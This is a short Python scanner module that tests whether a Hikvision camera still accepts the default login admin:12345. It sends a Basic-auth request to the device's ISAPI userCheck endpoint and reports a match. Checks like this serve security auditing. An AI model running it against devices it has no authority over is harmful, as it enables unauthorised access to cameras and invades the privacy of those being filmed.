# coding: utf-8

import sys
import requests
import warnings

def verify(protocol,ip,port):
    url = protocol + '://' + ip + ':' + str(port)
    warnings.filterwarnings("ignore")
    print('testing if hikvision default password admin+12345 vul')
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        "Authorization": "Basic YWRtaW46MTIzNDU="
    }
    payload = '/ISAPI/Security/userCheck'
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, headers=headers, timeout=3, verify=False)
        if r"<statusValue>200</statusValue>" in req.text:
            msg = 'There is hikvision default password vul on url: ' + url + ' with password : admin:12345 .'
            number = 'v108'
            return True, url, number, msg
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False, url,number,msg
    msg = 'There is no hikvision default password vul'
    number = 'v0'
    return False, url, number, msg


